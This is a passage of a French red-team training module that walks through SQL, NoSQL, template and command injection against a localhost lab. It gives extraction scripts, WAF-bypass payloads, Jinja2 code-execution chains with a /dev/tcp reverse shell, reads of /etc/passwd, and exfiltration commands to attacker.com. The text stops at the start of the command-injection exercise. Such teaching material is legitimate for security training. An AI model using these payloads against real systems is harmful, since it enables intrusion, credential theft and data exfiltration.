# Module 2 — Injections Avancées & Rappels HTTP

**Niveau** : M2 (Red Team)  
**Durée estimée** : 6–8 heures  
**Lab** : `http://localhost:8080`  
**Tags MITRE ATT&CK** : T1190, T1059.004

---

## Table des matières

1. [Rappels HTTP essentiels](#1-rappels-http-essentiels)
2. [SQL Injection avancée (T1190)](#2-sql-injection-avancée-t1190)
3. [NoSQL Injection — MongoDB (T1190)](#3-nosql-injection--mongodb-t1190)
4. [SSTI — Server-Side Template Injection (T1190)](#4-ssti--server-side-template-injection-t1190)
5. [Command Injection (T1059.004)](#5-command-injection-t1059004)
6. [XXE — XML External Entity (T1190)](#6-xxe--xml-external-entity-t1190)
7. [TP Synthèse](#7-tp-synthèse)
8. [Annexes](#8-annexes)

---

## 1. Rappels HTTP essentiels

### 1.1 Le cycle requête / réponse

Le protocole HTTP fonctionne sur un modèle **client-serveur** sans état (stateless). Le client envoie une **requête** (request), le serveur répond par une **réponse** (response).

#### Exemple de requête HTTP brute (GET)

```http
GET /api/transactions HTTP/1.1
Host: localhost:8080
User-Agent: Mozilla/5.0
Accept: application/json
Authorization: Bearer eyJhbGciOiJIUzI1NiIs...
Connection: close
```

#### Exemple de réponse HTTP brute

```http
HTTP/1.1 200 OK
Date: Sat, 30 May 2026 10:00:00 GMT
Server: nginx/1.24.0
Content-Type: application/json
Content-Length: 452
Connection: close

[
  {
    "id": 1,
    "user": "admin",
    "montant": 1500.00,
    "devise": "EUR"
  }
]
```

#### Anatomie d'une requête

| Élément | Description |
|---------|-------------|
| **Ligne de requête** | `METHODE /chemin HTTP/1.1` |
| **Headers** | Métadonnées (Host, User-Agent, Cookie, Content-Type…) |
| **Ligne vide** | Séparateur obligatoire (CRLF) |
| **Corps** | Données (présent pour POST, PUT, PATCH) |

#### Anatomie d'une réponse

| Élément | Description |
|---------|-------------|
| **Ligne de statut** | `HTTP/1.1 <code> <message>` (ex: `200 OK`, `401 Unauthorized`, `500 Internal Server Error`) |
| **Headers** | Server, Content-Type, Set-Cookie… |
| **Ligne vide** | Séparateur obligatoire |
| **Corps** | Contenu (HTML, JSON, XML, image…) |

---

### 1.2 Méthodes HTTP

| Méthode | Idempotent | Sécurisé | Corps | Usage |
|---------|-----------|----------|-------|-------|
| **GET** | Oui | Oui | Non | Récupérer une ressource |
| **POST** | Non | Non | Oui | Créer une ressource / soumettre un formulaire |
| **PUT** | Oui | Non | Oui | Remplacer complètement une ressource |
| **PATCH** | Non | Non | Oui | Modification partielle |
| **DELETE** | Oui | Non | Non (parfois oui) | Supprimer une ressource |
| **OPTIONS** | Oui | Oui | Non | Découvrir les méthodes autorisées |
| **HEAD** | Oui | Oui | Non | Identique à GET sans le corps |

#### Exemple d'enumeration OPTIONS

```bash
curl -X OPTIONS -v http://localhost:8080/api/
```

Réponse typique :

```http
HTTP/1.1 200 OK
Allow: GET, POST, PUT, DELETE, OPTIONS
```

---

### 1.3 Headers critiques en sécurité

#### Cookies

```http
Set-Cookie: sessionid=abc123; HttpOnly; Secure; SameSite=Lax
```

| Attribut | Rôle |
|----------|------|
| **HttpOnly** | Interdit l'accès au cookie via JavaScript (`document.cookie`) |
| **Secure** | Cookie transmis uniquement en HTTPS |
| **SameSite** | `Strict` : jamais en cross-site ; `Lax` : sur les navigations top-level (GET) ; `None` : toujours (nécessite Secure) |

#### Headers de sécurité

| Header | Valeur exemple | Protection |
|--------|---------------|-----------|
| **Content-Security-Policy** | `default-src 'self'; script-src 'self'` | XSS, injection de contenu |
| **Strict-Transport-Security** | `max-age=31536000; includeSubDomains` | Downgrade HTTPS → HTTP |
| **X-Frame-Options** | `DENY` ou `SAMEORIGIN` | Clickjacking |
| **X-Content-Type-Options** | `nosniff` | MIME sniffing |
| **Access-Control-Allow-Origin** | `https://app.com` (CORS) | Contrôle d'accès cross-origin |

##### Contre-mesure manuelle (enumération CORS)

```bash
curl -H "Origin: https://evil.com" -I http://localhost:8080/api/sensitive
```
Regarder si `Access-Control-Allow-Origin: https://evil.com` (CORS mal configuré).

---

### 1.4 CSP — Content Security Policy

La CSP est un header qui restreint les sources autorisées à charger du contenu.

Exemple restrictif :

```http
Content-Security-Policy: default-src 'none'; script-src 'self'; connect-src 'self'; img-src 'self'; style-src 'self'; frame-ancestors 'none'
```

**Test de contournement** : si `script-src` contient `'unsafe-inline'`, les XSS classiques passent. Si des CDN comme `cdnjs.cloudflare.com` sont dans `script-src`, on peut charger un vieux framework Angular avec sandbox bypass.

---

### 1.5 CORS — Cross-Origin Resource Sharing

Mécanisme qui permet à un navigateur d'autoriser ou non les requêtes cross-origin.

**Requête préflight OPTIONS** (quand la requête est "non simple") :

```http
OPTIONS /api/transactions HTTP/1.1
Origin: https://evil.com
Access-Control-Request-Method: POST
Access-Control-Request-Headers: X-Custom-Header
```

**Réponse du serveur** :

```http
Access-Control-Allow-Origin: https://evil.com
Access-Control-Allow-Methods: POST, GET
Access-Control-Allow-Credentials: true
```

Si `Access-Control-Allow-Origin: *` ET `Access-Control-Allow-Credentials: true`, le site est vulnérable à une fuite de données cross-origin.

---

### 1.6 Méthodologie de pentest web

![Diagram 1 - Méthodologie de pentest web — 5 phases](annexes/images/m2_diagram_1.svg)

#### Commandes de reconnaissance initiale

```bash
# Scan des ports ouverts
nmap -sV -p1-10000 localhost

# Découverte d'endpoints
gobuster dir -u http://localhost:8080 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50

# Détection de technologies
curl -sI http://localhost:8080 | grep -iE 'server|x-powered-by|set-cookie'
```

---

## 2. SQL Injection avancée (T1190)

### MITRE ATT&CK

| ID | Nom | Description |
|----|-----|-------------|
| **T1190** | Exploit Public-Facing Application | L'attaquant exploite une injection SQL dans une application exposée publiquement |
| **T1505.003** | Server Software Component: Web Shell | Après extraction, dépose un webshell via INTO OUTFILE / INTO DUMPFILE |

### 2.1 Typologie des SQL Injections

| Type | Principe | Retour visible | Temps réel | Rapidité | Facilité |
|------|----------|---------------|------------|----------|----------|
| **Union-based** | UNION SELECT pour fusionner les résultats | Oui (dans la page) | Non | Très rapide | Facile |
| **Error-based** | Extraction via les messages d'erreur (double query, extractvalue) | Oui (dans l'erreur) | Non | Rapide | Facile |
| **Boolean blind** | Comparaison VRAI/FAUX via le comportement de la page | Partiel (page ≠) | Non | Lent | Moyen |
| **Time-based blind** | Inférence via des délais (SLEEP, pg_sleep, WAITFOR) | Aucun | Oui (pauses) | Très lent | Moyen |
| **Out-of-band** | Exfiltration via canal DNS/HTTP externe | Aucun | Non | Variable | Difficile |
| **Second-order** | Injection stockée, déclenchée ailleurs | Variable | Variable | Variable | Difficile |

### 2.2 Time-based blind MySQL — SLEEP

#### Payloads pour MySQL

```sql
# Test baseline : si vrai, attend 5 secondes
' OR SLEEP(5) --
1' AND SLEEP(5) --
1' AND IF(1=1, SLEEP(5), 0) --

# Extraction d'un caractère (exemple : version de la DB)
1' AND IF(SUBSTRING((SELECT VERSION()),1,1)='8', SLEEP(3), 0) --

# Avec BENCHMARK (alternative à SLEEP dans certains cas)
1' AND BENCHMARK(5000000, MD5('test')) --
```

#### Script d'extraction caractère par caractère

```python
#!/usr/bin/env python3
"""
Time-based blind SQLi extractor — MySQL
Cible : http://localhost:8080/api/transactions?filter=
"""

import requests
import string
import sys

TARGET = "http://localhost:8080/api/transactions"
DELAY = 3  # secondes de sleep quand la condition est vraie
TIMEOUT = DELAY + 2

def inject(payload):
    """Envoie la requête et retourne True si le serveur a délaiyé."""
    params = {"filter": payload}
    try:
        r = requests.get(TARGET, params=params, timeout=TIMEOUT)
        return r.elapsed.total_seconds() >= DELAY
    except requests.exceptions.ReadTimeout:
        return True
    except requests.exceptions.Timeout:
        return True

def extract_string(query, charset=string.printable):
    """Extrait une chaîne depuis la base de données caractère par caractère."""
    extracted = ""
    for pos in range(1, 64):  # max 64 caractères
        found = False
        for c in charset:
            # Injection time-based : tester si le caractère à la position pos est 'c'
            payload = (
                f"1' AND IF(SUBSTRING(({query}),{pos},1)='{c}', SLEEP({DELAY}), 0) -- -"
            )
            if inject(payload):
                extracted += c
                print(f"[+] Position {pos} : '{c}' => extrait: {extracted}")
                found = True
                break
        if not found:
            break
    return extracted

if __name__ == "__main__":
    print("[*] Extraction du nom de la base de données...")
    db_name = extract_string("SELECT DATABASE()", charset=string.ascii_lowercase + string.digits + '_')
    print(f"[+] Database : {db_name}")

    print("[*] Extraction de la version MySQL...")
    version = extract_string("SELECT VERSION()", charset=string.printable)
    print(f"[+] Version : {version}")
```

### 2.3 Time-based blind PostgreSQL — pg_sleep

#### Payloads pour PostgreSQL

```sql
-- Test baseline
' OR (SELECT pg_sleep(5)) IS NULL --
1' ; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END --

-- Extraction de version
1' AND (SELECT CASE WHEN SUBSTRING((SELECT VERSION()),1,1)='P' THEN pg_sleep(5) ELSE pg_sleep(0) END) IS NOT NULL --

-- Alternative avec génération de séquence
1' AND (SELECT count(*) FROM generate_series(1,5000000)) IS NOT NULL --
```

#### Variante avec requête préparée

```sql
1' AND (SELECT CASE WHEN (SELECT current_database() LIKE 'a%') THEN pg_sleep(5) ELSE pg_sleep(0) END) --
```

### 2.4 Time-based blind MSSQL — WAITFOR DELAY

#### Payloads pour MSSQL

```sql
-- Test baseline
'; WAITFOR DELAY '0:0:5' --
1'; IF (1=1) WAITFOR DELAY '0:0:5' --

-- Extraction de version
1'; IF (SUBSTRING((SELECT @@version),1,1)='M') WAITFOR DELAY '0:0:5' --

-- Alternative avec CASE
1'; SELECT CASE WHEN (1=1) THEN WAITFOR DELAY '0:0:5' ELSE WAITFOR DELAY '0:0:0' END --
```

---

### 2.5 TP Guidé — Exploitation SQLi time-based blind sur `/api/transactions?filter=`

#### Étape 1 : Détection

```bash
# Tester si le paramètre filter est vulnérable
curl -s --max-time 10 "http://localhost:8080/api/transactions?filter=1'"
```

Si une erreur SQL apparaît ou une réponse différente, le point d'injection est confirmé.

```bash
# Time-based test
time curl -s "http://localhost:8080/api/transactions?filter=1'%20OR%20SLEEP(5)%20--%20-"
```

**Résultat attendu** : la requête prend ~5 secondes.

#### Étape 2 : Identifier le SGBD

Utiliser les variations de syntaxe :

```bash
# MySQL
curl -s --max-time 10 "http://localhost:8080/api/transactions?filter=1'%20OR%20SLEEP(3)%20--%20-"

# PostgreSQL
curl -s --max-time 10 "http://localhost:8080/api/transactions?filter=1'%20OR%20(SELECT%20pg_sleep(3))%20--%20-"

# MSSQL
curl -s --max-time 10 "http://localhost:8080/api/transactions?filter=1'%3B%20WAITFOR%20DELAY%20'0:0:3'%20--%20-"
```

#### Étape 3 : Extraction de la structure

```bash
# Obtenir le nombre de colonnes (ORDER BY)
curl -s "http://localhost:8080/api/transactions?filter=1'%20ORDER%20BY%205%20--%20-"
curl -s "http://localhost:8080/api/transactions?filter=1'%20ORDER%20BY%206%20--%20-"
# Si la première échoue et la seconde aussi, c'est qu'il y a 5 colonnes
```

#### Étape 4 : Extraction du nom de la base

```bash
# Time-based : tester si la DB commence par 'l'
curl -s --max-time 10 "http://localhost:8080/api/transactions?filter=1'%20AND%20IF(SUBSTRING((SELECT%20DATABASE()),1,1)='l',SLEEP(3),0)%20--%20-"
```

#### Étape 5 : Automatisation avec sqlmap

```bash
# Interception du proxy Burp (optionnel)
export http_proxy=http://127.0.0.1:8080
export https_proxy=http://127.0.0.1:8080

# Lancer sqlmap sur le paramètre filter
sqlmap -u "http://localhost:8080/api/transactions?filter=1" \
       --technique=T \
       --batch \
       --level=3 \
       --risk=2 \
       --dbms=mysql \
       -v 3
```

**Explication des flags :**

| Flag | Rôle |
|------|------|
| `-u` | URL cible |
| `--technique=T` | Utiliser uniquement la technique time-based |
| `--batch` | Mode non-interactif (réponses par défaut) |
| `--level=3` | Niveau de tests (1-5, plus haut = plus de payloads) |
| `--risk=2` | Risque (1-3, plus haut = plus destructeur) |
| `--dbms=mysql` | Forcer le SGBD cible |
| `-v 3` | Verbosité (3 = affiche les payloads) |

```bash
# Lister les bases de données
sqlmap -u "http://localhost:8080/api/transactions?filter=1" \
       --technique=T \
       --batch \
       --dbs

# Lister les tables de la base 'lab'
sqlmap -u "http://localhost:8080/api/transactions?filter=1" \
       --technique=T \
       --batch \
       -D lab --tables

# Dump complet de la table 'users'
sqlmap -u "http://localhost:8080/api/transactions?filter=1" \
       --technique=T \
       --batch \
       -D lab -T users --dump
```

#### Étape 6 : Script d'extraction custom

Utiliser le script Python de la section 2.2 en adaptant le TARGET :

```bash
# Lancer l'extraction caractère par caractère
python3 sqlite_time_extract.py
```

#### Étape 7 : WAF Bypass

Si un WAF (Web Application Firewall) bloque les payloads classiques, voici des techniques de contournement :

```bash
# 1. Commentaires fragmentés
curl -s "http://localhost:8080/api/transactions?filter=1'/**/OR/**/SLEEP(3)/**/--/**/-"

# 2. Encodage alterné
curl -s "http://localhost:8080/api/transactions?filter=1'%09OR%0ASLEEP(3)%00--%20-"

# 3. Case variation
curl -s "http://localhost:8080/api/transactions?filter=1'%20oR%20SlEeP(3)%20--%20-"

# 4. Doublure de caractères (pour WAF basés sur des patterns)
curl -s "http://localhost:8080/api/transactions?filter=1'%20OORR%20SLEEP(3)%20--%20-"

# 5. Utilisation de variables MySQL
curl -s "http://localhost:8080/api/transactions?filter=1'%20OR%20(@%3A=1)%20OR%20SLEEP(3)%20--%20-"

# 6. Encodage HTTP alternatif (double URL encoding)
curl -s "http://localhost:8080/api/transactions?filter=1'%2520OR%2520SLEEP(3)%2520--%2520-"
```

**Techniques avancées WAF bypass :**

| Technique | Description |
|-----------|-------------|
| **HTTP Parameter Pollution** | `?filter=1'&filter=OR SLEEP(3)--` |
| **HTTP Parameter Fragmentation** | Découper le payload sur plusieurs paramètres |
| **Encodage chunked** | Transfer-Encoding: chunked avec split du payload |
| **Encodage Unicode** | Encoder certains caractères en UTF-8/UTF-16 |
| **Buffer Overflow** | Saturer le buffer du WAF `?filter=AAAAAA...<payload>` |

---

### 2.6 Outils pour SQLi

#### sqlmap — Configuration et utilisation avancée

```bash
# Installation
git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git /opt/sqlmap
ln -s /opt/sqlmap/sqlmap.py /usr/local/bin/sqlmap

# Utilisation avec un fichier de requête (Burp request file)
sqlmap -r /tmp/request.txt --technique=T --batch

# Utilisation avec authentification
sqlmap -u "http://localhost:8080/api/transactions?filter=1" \
       --cookie="sessionid=abc123" \
       --auth-type=Bearer \
       --auth-token="eyJhbGciOiJIUzI1NiIs..."

# Utilisation avec proxy
sqlmap -u "http://localhost:8080/api/transactions?filter=1" \
       --proxy="http://127.0.0.1:8080" \
       --technique=T

# Utilisation avec tamper script (bypass WAF)
sqlmap -u "http://localhost:8080/api/transactions?filter=1" \
       --technique=T \
       --tamper=space2comment,randomcase

# Liste des tamper scripts disponibles
ls /opt/sqlmap/tamper/
```

**Tamper scripts utiles :**

| Script | Effet |
|--------|-------|
| `space2comment` | Remplace les espaces par `/**/` |
| `randomcase` | Mélange la casse des mots-clés |
| `between` | Remplace `>` par `NOT BETWEEN` |
| `equaltolike` | Remplace `=` par `LIKE` |
| `halfversionedmorekeywords` | Ajoute des commentaires versionnés MySQL |
| `ifnull2casewhenisnull` | Remplace IFNULL par CASE |
| `modsecurityversioned` | Contourne ModSecurity |
| `charencode` | Encode les caractères en URL |

---

## 3. NoSQL Injection — MongoDB (T1190)

### MITRE ATT&CK

| ID | Nom | Description |
|----|-----|-------------|
| **T1190** | Exploit Public-Facing Application | Exploitation d'une injection NoSQL dans une application exposée |

### 3.1 Principe

Contrairement au SQL, le NoSQL (MongoDB) utilise des opérateurs JSON pour interroger la base. L'injection consiste à injecter des opérateurs MongoDB dans les paramètres JSON ou URL-encodés.

| Opérateur | Rôle | Exemple |
|-----------|------|---------|
| `$ne` | Not equal | `{"password": {"$ne": ""}}` |
| `$gt` | Greater than | `{"age": {"$gt": "18"}}` |
| `$regex` | Expression régulière | `{"username": {"$regex": "^a"}}` |
| `$where` | Code JavaScript | `{"$where": "this.password.length > 5"}` |
| `$nin` | Not in | `{"role": {"$nin": ["admin", "root"]}}` |
| `$exists` | Champ existe | `{"email": {"$exists": true}}` |

### 3.2 Bypass d'authentification MongoDB

#### Injection via formulaire JSON (POST)

```json
{
  "username": "admin",
  "password": { "$ne": "" }
}
```

Cette requête retourne l'utilisateur `admin` si son mot de passe n'est pas vide (quasiment toujours vrai). Si le serveur vérifie directement le `count()` > 0, l'authentification est contournée.

#### Injection via URL-encoded

```bash
# Bypass classique
curl -s http://localhost:8080/api/login \
  -H "Content-Type: application/json" \
  -d '{"username": {"$ne": ""}, "password": {"$ne": ""}}'

# Retourne le premier utilisateur non-admin
curl -s http://localhost:8080/api/login \
  -H "Content-Type: application/json" \
  -d '{"username": {"$gt": ""}, "password": {"$gt": ""}}'
```

### 3.3 Extraction blind via $regex

L'extraction aveugle fonctionne en testant des caractères un par un avec `$regex` :

```json
// Tester si le mot de passe commence par 'a'
{"username": "admin", "password": {"$regex": "^a"}}

// Tester si le mot de passe commence par 'b'
{"username": "admin", "password": {"$regex": "^b"}}
```

#### Script Python d'extraction blind NoSQL

```python
#!/usr/bin/env python3
"""
Blind NoSQL injection extractor — MongoDB regex-based
Cible : http://localhost:8080/api/login (POST JSON)
"""

import requests
import string
import sys
import json

TARGET = "http://localhost:8080/api/login"
CHARSET = string.ascii_lowercase + string.digits + '_-@.'

def test_regex(regex_pattern):
    """Retourne True si le pattern correspond."""
    payload = {
        "username": "admin",
        "password": {"$regex": regex_pattern}
    }
    r = requests.post(TARGET, json=payload)
    # Si la réponse contient "success" ou "token", le test est vrai
    return "success" in r.text or "token" in r.text

def extract_password(username="admin", max_len=64):
    """Extrait le mot de passe caractère par caractère."""
    extracted = ""
    for pos in range(max_len):
        found = False
        for c in CHARSET:
            regex = f"^{extracted}{c}.*"
            if test_regex(regex):
                extracted += c
                print(f"[+] Position {pos} : '{c}' => password: {extracted}")
                found = True
                break
        if not found:
            # Tester si le mot de passe est exact
            if test_regex(f"^{re.escape(extracted)}$"):
                print(f"[+] Mot de passe complet trouvé : {extracted}")
                return extracted
            break
    return extracted

if __name__ == "__main__":
    print("[*] Extraction du mot de passe pour 'admin'...")
    pwd = extract_password()
    print(f"\n[+] Résultat : admin:{pwd}")
```

### 3.4 Injection via $where (JavaScript Injection)

L'opérateur `$where` exécute du JavaScript sur le serveur MongoDB. Cela permet :

```json
// Time-based detection
{"$where": "sleep(5000) || true"}

// Extraction via exception
{"$where": "if(this.password[0]=='a'){{throw 'match'}}else{{throw 'no'}}"}

// Lire des variables d'environnement (MongoDB 4.x+)
{"$where": "hex_md5(env.HOSTNAME)"}
```

#### Payloads $where avancés

```json
{
  "$where": "function(){ if(this.username=='admin') { return true } }"
}

// Sleep JS pur (MongoDB 4.2+)
{
  "$where": "function(){ sleep(5000); return true }"
}
```

### 3.5 TP Guidé — Endpoint `/api/export` (POST JSON)

#### Étape 1 : Détection

```bash
# Requête normale
curl -s http://localhost:8080/api/export \
  -H "Content-Type: application/json" \
  -d '{"collection": "users"}'

# Tentative d'injection $ne
curl -s http://localhost:8080/api/export \
  -H "Content-Type: application/json" \
  -d '{"collection": {"$ne": ""}}'
```

#### Étape 2 : Identifier les collections

```bash
# Tester différentes collections
curl -s http://localhost:8080/api/export \
  -H "Content-Type: application/json" \
  -d '{"collection": "transactions"}'

curl -s http://localhost:8080/api/export \
  -H "Content-Type: application/json" \
  -d '{"collection": "products"}'

curl -s http://localhost:8080/api/export \
  -H "Content-Type: application/json" \
  -d '{"collection": "sessions"}'
```

#### Étape 3 : Injection $regex sur une collection

```bash
# Extraire les utilisateurs dont le nom commence par 'a'
curl -s http://localhost:8080/api/export \
  -H "Content-Type: application/json" \
  -d '{"collection": "users", "filter": {"username": {"$regex": "^a"}}}'
```

#### Étape 4 : Test d'injection $where

```bash
# Tester si l'injection JavaScript fonctionne
curl -s http://localhost:8080/api/export \
  -H "Content-Type: application/json" \
  -d '{"collection": "users", "filter": {"$where": "1"}}'

# Time-based via $where
curl -s --max-time 10 http://localhost:8080/api/export \
  -H "Content-Type: application/json" \
  -d '{"collection": "users", "filter": {"$where": "function(){ sleep(5000); return true }"}}'
```

#### Étape 5 : Extraction complète

```python
#!/usr/bin/env python3
"""
Script d'extraction NoSQL complet pour /api/export
"""

import requests
import json
import string
import sys

TARGET = "http://localhost:8080/api/export"

def extract_field(collection, field, regex):
    """Teste si un champ correspond à un pattern regex."""
    payload = {
        "collection": collection,
        "filter": {field: {"$regex": regex}}
    }
    r = requests.post(TARGET, json=payload)
    return len(r.json()) > 0 if r.ok else False

def brute_field(collection, field, charset=string.ascii_lowercase + string.digits):
    """Extrait un champ par blind regex."""
    extracted = ""
    for pos in range(32):
        found = False
        for c in charset:
            pattern = f"^{extracted}{c}"
            if extract_field(collection, field, pattern):
                extracted += c
                print(f"[{collection}] {field} : {extracted}")
                found = True
                break
        if not found:
            break
    return extracted

if __name__ == "__main__":
    # Extraction des champs de la collection users
    print("[*] Extraction des emails...")
    email = brute_field("users", "email", charset=string.ascii_lowercase + string.digits + '@._-')
    print(f"[+] Email trouvé : {email}")

    print("[*] Extraction des mots de passe...")
    password = brute_field("users", "password", charset=string.printable)
    print(f"[+] Password trouvé : {password}")
```

#### Étape 6 : Automatisation alternative

```bash
# Utiliser NoSQLMap (outil dédié NoSQL)
git clone https://github.com/codingo/NoSQLMap.git /opt/nosqlmap
cd /opt/nosqlmap
python nosqlmap.py --target http://localhost:8080 --method POST --data '{"username":"admin","password":"x"}'

# Alternative : Burp Suite + NoSQL injection payloads
```

---

## 4. SSTI — Server-Side Template Injection (T1190)

### MITRE ATT&CK

| ID | Nom | Description |
|----|-----|-------------|
| **T1190** | Exploit Public-Facing Application | Exploitation SSTI menant à une exécution de code |
| **T1059** | Command and Scripting Interpreter | Exécution de commandes via le moteur de template |

### 4.1 Principe

La SSTI se produit quand un moteur de template interprète la saisie utilisateur comme du code de template au lieu de données statiques. Cela permet l'accès aux objets internes du framework et potentiellement une RCE.

### 4.2 Détection — Payloads universels

```http
POST /admin/templates HTTP/1.1
Host: localhost:8080
Content-Type: application/x-www-form-urlencoded

template={{7*7}}
```

Si le résultat est `49` ou `7*7`, le moteur a interprété le template.

**Tableau de détection :**

| Payload | Résultat attendu | Moteur |
|---------|-----------------|--------|
| `{{7*7}}` | `49` | Jinja2, Twig |
| `${7*7}` | `49` | Freemarker, Velocity |
| `#{7*7}` | `49` | Pebble, Thymeleaf |
| `*{7*7}` | `49` | Velocity |
| `{{7*'7'}}` | `77` | Jinja2 (concaténation) |
| `<%= 7*7 %>` | `49` | ERB (Ruby) |
| `{{config}}` | Objet config | Flask/Jinja2 |
| `{{self}}` | Objet self | Jinja2 |

### 4.3 Framework-specific

#### Jinja2 (Python/Flask)

```jinja
# Détection
{{ 7*7 }}

# Accès à la classe parente (MRO)
{{ ''.__class__.__mro__[1].__subclasses__() }}

# Recherche de <class 'subprocess.Popen'>
{{ ''.__class__.__mro__[1].__subclasses__()[X]('id', shell=True, stdout=-1).communicate() }}
```

#### Twig (PHP)

```twig
# Détection
{{ 7*7 }}

# RCE : self → getEnvironment → setLoader → charge un fichier distant
{{ self.env.registerUndefinedFilterCallback("exec") }}
{{ self.env.getFilter("id") }}

# Alternative via getFunctions
{{ _self.env.setLoader(system) }}{{ _self.env.run("id") }}
```

#### Freemarker (Java)

```ftl
# Détection
${7*7}

# RCE via new()
${"freemarker.template.utility.Execute"?new()("id")}

# RCE via Runtime
${"java.lang.Runtime"?new()?new()?exec("id")}
```

#### Velocity (Java)

```velocity
# Détection
#set($x = 7*7) $x

# RCE
#set($e = $class.inspect("java.lang.Runtime").getRuntime().exec("id"))
```

#### ERB (Ruby)

```erb
# Détection
<%= 7*7 %>

# RCE
<%= system("id") %>
<%= `id` %>
```

### 4.4 Jinja2 RCE — 3 chemins différents

#### Chemin 1 : Cycler (le plus fiable)

```jinja
{{ cycler.__init__.__globals__.os.popen('id').read() }}
```

**Explication :** L'objet `cycler` est accessible globalement dans Jinja2. On remonte à ses globals (qui contiennent les imports Python), on accède au module `os`, puis à `popen`.

#### Chemin 2 : Lipsum

```jinja
{{ lipsum.__globals__['os'].popen('id').read() }}
```

**Explication :** `lipsum` est un générateur de texte factice (lorem ipsum) disponible dans Jinja2. Son attribut `__globals__` expose les modules Python chargés.

#### Chemin 3 : config.\_\_class\_\_

```jinja
{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}
```

**Explication :** `config` est l'objet de configuration Flask. On utilise le chaînage `__class__.__init__.__globals__` pour remonter jusqu'aux modules système et atteindre `os`.

#### Où trouver l'index de `subprocess.Popen` ?

```python
#!/usr/bin/env python3
"""
Trouve l'index de la classe subprocess.Popen dans les sous-classes de object.
"""

import requests
import re

TARGET = "http://localhost:8080/admin/templates"

# Injecter la liste des sous-classes
payload = "template={{ ''.__class__.__mro__[1].__subclasses__() }}"
r = requests.post(TARGET, data={"template": payload})

# Chercher Popen dans le résultat
match = re.findall(r"<class 'subprocess\.Popen'>", r.text)
if match:
    print("[+] subprocess.Popen trouvé ! Recherche de l'index...")
    # Injection spécifique pour trouver l'index
    for i in range(500):
        payload = f"template={{ ''.__class__.__mro__[1].__subclasses__()[{i}] }}"
        r = requests.post(TARGET, data={"template": payload})
        if "subprocess.Popen" in r.text:
            print(f"[+] Index trouvé : {i}")
            break
```

### 4.5 Payloads utiles (Jinja2)

```jinja
# Commande simple
{{ cycler.__init__.__globals__.os.popen('id').read() }}

# Reverse shell
{{ cycler.__init__.__globals__.os.popen('bash -c "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"').read() }}

# Lire un fichier
{{ cycler.__init__.__globals__.open('/etc/passwd').read() }}

# Lister un répertoire
{{ cycler.__init__.__globals__.os.listdir('/') }}

# Afficher la configuration Flask
{{ config }}

# Afficher les routes Flask
{{ url_for.__globals__['current_app'].url_map }}
```

#### Version compacte (pour champs de taille limitée)

```jinja
{{ lipsum.__globals__.os.popen('id').read() }}
```

### 4.6 TP Guidé — Endpoint `/admin/templates` (POST form)

#### Étape 1 : Détection

```bash
# Tester avec un payload mathématique simple
curl -s http://localhost:8080/admin/templates \
  -d "template={{7*7}}"

# Vérifier si le résultat contient "49"
curl -s http://localhost:8080/admin/templates \
  -d "template={{7*7}}" | grep -o "49"
```

#### Étape 2 : Confirmer Jinja2

```bash
# La concaténation fonctionne uniquement en Jinja2
curl -s http://localhost:8080/admin/templates \
  -d "template={{7*'7'}}"

# Résultat attendu : "77" (pas "49")
```

#### Étape 3 : Accès à l'objet config

```bash
curl -s http://localhost:8080/admin/templates \
  -d "template={{config}}"
```

**Résultat typique :**

```json
{
  "SECRET_KEY": "super-secret-key-123",
  "SQLALCHEMY_DATABASE_URI": "mysql+pymysql://root:password@db/lab",
  "DEBUG": true,
  "SESSION_COOKIE_HTTPONLY": true,
  "SESSION_COOKIE_SAMESITE": "Lax"
}
```

#### Étape 4 : Remonter la chaîne d'héritage

```bash
# Lister les sous-classes disponibles
curl -s http://localhost:8080/admin/templates \
  -d "template={{ ''.__class__.__mro__[1].__subclasses__() }}"
```

#### Étape 5 : Exécution de commande (RCE)

```bash
# Avec cycler (recommended)
curl -s http://localhost:8080/admin/templates \
  -d "template={{ cycler.__init__.__globals__.os.popen('id').read() }}"

# Avec lipsum
curl -s http://localhost:8080/admin/templates \
  -d "template={{ lipsum.__globals__['os'].popen('id').read() }}"

# Avec config.__class__
curl -s http://localhost:8080/admin/templates \
  -d "template={{ config.__class__.__init__.__globals__['os'].popen('id').read() }}"
```

#### Étape 6 : Reverse shell

```bash
# Sur la machine attaquante : lancer un listener
nc -lvnp 4444

# Dans l'injection SSTI (remplacer 10.0.0.1 par votre IP)
curl -s http://localhost:8080/admin/templates \
  -d "template={{ cycler.__init__.__globals__.os.popen('bash -c \"bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\"').read() }}"
```

#### Étape 7 : Exfiltration

```bash
# Lire les fichiers sensibles
curl -s http://localhost:8080/admin/templates \
  -d "template={{ cycler.__init__.__globals__.open('/etc/passwd').read() }}"

# Lire la source de l'application
curl -s http://localhost:8080/admin/templates \
  -d "template={{ cycler.__init__.__globals__.open('/app/app.py').read() }}"
```

---

## 5. Command Injection (T1059.004)

### MITRE ATT&CK

| ID | Nom | Description |
|----|-----|-------------|
| **T1059.004** | Command and Scripting Interpreter: Unix Shell | Injection de commandes shell via l'application |

### 5.1 Opérateurs de chaînage Linux

| Opérateur | Rôle | Exemple |
|-----------|------|---------|
| `;` | Exécute la suivante, quel que soit le résultat | `ping 8.8.8.8; id` |
| `&&` | Exécute si la précédente réussit (exit code 0) | `ping 8.8.8.8 && id` |
| `\|\|` | Exécute si la précédente échoue | `ping invalid_host \|\| id` |
| `` `cmd` `` | Substitution de commande (backticks) | `ping \`whoami\`` |
| `$(cmd)` | Substitution de commande (moderne) | `ping $(whoami)` |
| `\|` | Pipe la sortie vers une autre commande | `ping 8.8.8.8 \| id` |
| `&` | Arrière-plan (background) | `ping 8.8.8.8 & id` |

### 5.2 Blind exploitation

#### Time-based

```bash
# Si la commande est exécutée, on observe un délai
curl -s http://localhost:8080/api/ping \
  -d "host=8.8.8.8; sleep 5"
```

#### Out-of-band (exfiltration DNS)

```bash
# Exfiltrer via DNS (avec un serveur DNS contrôlé)
curl -s http://localhost:8080/api/ping \
  -d "host=8.8.8.8; nslookup \`whoami\`.attacker.com"

# Alternative avec curl vers un serveur HTTP contrôlé
curl -s http://localhost:8080/api/ping \
  -d "host=8.8.8.8; curl http://attacker.com/\`whoami\`"
```

### 5.3 TP Guidé — Endpoint `/api/ping` (POST form)

#### Étape 1 : Détection

```bash
# Fonctionnement normal
